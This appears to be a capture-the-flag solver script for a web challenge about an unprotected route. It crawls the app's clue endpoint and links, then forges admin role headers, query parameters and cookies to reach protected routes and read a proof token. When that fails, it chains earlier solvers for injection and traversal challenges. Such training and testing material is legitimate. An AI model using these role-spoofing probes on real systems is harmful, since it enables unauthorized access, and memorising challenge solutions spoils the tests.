#!/usr/bin/env python3
"""Solver for this challenge -- harness skeleton. Fill in `answer()`; keep the I/O contract unchanged.

    solve.py --contract <contract.json> --artifacts <dir>   ->  prints {answer_id: value} as JSON on the last line

Runs on the Homebase VM inside a ~6-7 s window for EVERY Mastery set: stdlib + lib.* + pyzipper/pyelftools/pefile/
capstone/pycryptodome/androguard only, no subprocess to 7z/jadx/etc., all sets well under 1 s. Mastery questions name
their files like 'delivery 2: sample_02.apk' or 'evidence.zip -> member': `artifact_bytes()` resolves both (by sha256
pairing first, so same-named per-set deliveries never get mixed up)."""
import argparse
import json
import os
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parents[4]
sys.path.insert(0, str(ROOT))
from lib.common import (container_by_sha, delivery_missing, find_artifact, group_by_set, load_contract,  # noqa: E402
                        normalize)

_cache = {}


def artifact_bytes(root, contract, artifact):
    """Bytes for a question's `artifact` string (cached per artifact)."""
    if artifact in _cache:
        return _cache[artifact]
    container, _, member = (x.strip() for x in artifact.partition("->"))
    data = None
    p = container_by_sha(root, contract, container)
    if p is not None and not member:
        data = p.read_bytes()
    elif not delivery_missing(root, contract, container):
        for cand in (artifact, container.split(": ", 1)[-1] + (f" -> {member}" if member else "")):
            try:
                data = find_artifact(root, cand)
                break
            except FileNotFoundError:
                continue
    _cache[artifact] = data
    return data


import re
import urllib.error
import urllib.parse
import urllib.request

UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
PROOF_RE = re.compile(r"proof_[0-9A-Za-z]{8,}")


def _target_url(question, contract):
    art = (question.get("artifact") or "").strip()
    targets = contract.get("targets") or []
    for t in targets:
        if (t.get("id") or "").strip().lower() == art.lower():
            return t.get("url")
    m = re.search(r"\d+", art)
    if m:
        for t in targets:
            if re.search(r"\d+", t.get("id") or "") and re.search(r"\d+", t["id"]).group() == m.group():
                return t.get("url")
    return targets[0].get("url") if len(targets) == 1 else None


def _get(url, headers=None, timeout=6):
    h = {"User-Agent": UA, "Accept": "application/json, text/html;q=0.9, */*;q=0.8"}
    h.update(headers or {})
    req = urllib.request.Request(url, headers=h)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read(1 << 20).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(1 << 20).decode("utf-8", "replace")


def _proof(body):
    try:
        j = json.loads(body)
    except ValueError:
        j = None
    if isinstance(j, dict):
        for k in ("evidence", "proof", "flag"):
            v = j.get(k)
            if isinstance(v, str) and v.strip():
                return v.strip()
    m = PROOF_RE.search(body or "")
    return m.group() if m else None


def _routes(base):
    """Feature routes the visible notes (/api/clues + home page links) point to."""
    routes = []
    st, body = _get(urllib.parse.urljoin(base, "/api/clues"))
    try:
        j = json.loads(body)
    except ValueError:
        j = {}
    if isinstance(j, dict):
        for k, v in j.items():
            if isinstance(v, str) and v.startswith("/") and ("route" in k or "path" in k or "endpoint" in k):
                routes.append(v)
        for k, v in j.items():
            if isinstance(v, list):
                routes += [x for x in v if isinstance(x, str) and x.startswith("/")]
    if not routes:
        _, home = _get(base)
        routes += [r for r in re.findall(r'href="(/[^"#]*)"', home) if not r.startswith(("/assets", "/api/clues"))]
    return list(dict.fromkeys(routes))


def answer(answer_id, question, data, contract):
    """Unprotected feature route ('a sign, no lock'): GET the route from the workspace notes as-is and read the
    proof; if it refuses, assert the admin role the way the app's own notes name it (header / query)."""
    base = _target_url(question, contract)
    if not base:
        return None
    for r in _routes(base):
        url = urllib.parse.urljoin(base, r)
        for hdr, qs in (({}, ""), ({"X-Role": "admin", "X-User-Role": "admin"}, ""), ({}, "?role=admin"),
                        ({"Cookie": "role=admin"}, "")):
            st, body = _get(url + qs, hdr)
            p = _proof(body) if st == 200 else None
            if p:
                return p
    return None


def fallback(answer_id, question, data, contract):
    """Called ONLY when answer() found nothing (None or an exception): a cheap generic second try for a variant shape
    the direct parse doesn't know (Time Trial / Mastery mutate the task) -- e.g. the lane lib's name-agnostic decoder
    over `data`, then a match against question["answer_format"]. None = give up on this field only.
    Mastery compounds earlier web days: try their solvers' answer() on the same target."""
    import importlib.util
    for d in ("day03/web-query-me-this", "day02/web-permission-to-slip", "day01/web-back-up-a-minute",
              "day20/web-stay-in-your-directory"):
        p = ROOT / "challenges" / d / "solver" / "solve.py"
        if not p.exists():
            continue
        try:
            spec = importlib.util.spec_from_file_location("prior_" + d.split("/")[0], p)
            mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)
            v = mod.answer(answer_id, question, data, contract)
            if v:
                return v
        except Exception as e:  # noqa: BLE001
            print(f"{answer_id}: prior {d} {e!r}", file=sys.stderr)
    return None


def _past_deadline():
    """The timed runner's HCTF_SOLVE_DEADLINE (epoch) has passed: print the answers found so far instead."""
    try:
        return time.time() > float(os.environ["HCTF_SOLVE_DEADLINE"])
    except (KeyError, ValueError):
        return False


def _solve_pairs(job):
    """Answer one group of (answer_id, question) pairs -- a whole Mastery set, or the whole contract."""
    root, contract, pairs = job
    out = {}
    for aid, q in pairs:
        data = artifact_bytes(root, contract, q.get("artifact") or "")
        try:
            v = answer(aid, q, data, contract)
        except Exception as e:  # noqa: BLE001 - one bad field must not sink the other answers
            print(f"{aid}: {e!r}", file=sys.stderr)
            v = None
        if v is None and not _past_deadline():   # in-window: never let a fallback search eat the kill margin
            try:
                v = fallback(aid, q, data, contract)
            except Exception as e:  # noqa: BLE001
                print(f"{aid}: fallback {e!r}", file=sys.stderr)
        if v is not None:
            out[aid] = normalize(v, q)
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--contract", required=True)
    ap.add_argument("--artifacts", required=True)
    a = ap.parse_args()
    contract, pairs = load_contract(a.contract)
    groups = group_by_set(pairs)
    out = {}
    if len(groups) >= 2 and os.environ.get("HCTF_SOLVER_PARALLEL", "1") != "0":
        # Mastery: every set runs inside ONE clock -- one forked process per set (the Homebase VM has 2 vCPUs; heavy
        # per-set work such as unzipping 31 MB deliveries halves). Same results as the sequential loop.
        import multiprocessing as mp
        from concurrent.futures import ProcessPoolExecutor
        try:
            with ProcessPoolExecutor(max_workers=min(len(groups), os.cpu_count() or 2),
                                     mp_context=mp.get_context("fork")) as ex:
                for part in ex.map(_solve_pairs, [(a.artifacts, contract, g) for g in groups.values()]):
                    out.update(part)
        except Exception as e:  # noqa: BLE001 - never lose a solve to the pool: fall back to sequential
            print(f"parallel sets failed ({e!r}); sequential", file=sys.stderr)
            out = _solve_pairs((a.artifacts, contract, pairs))
    else:
        out = _solve_pairs((a.artifacts, contract, pairs))
    print(json.dumps(out))


if __name__ == "__main__":
    main()
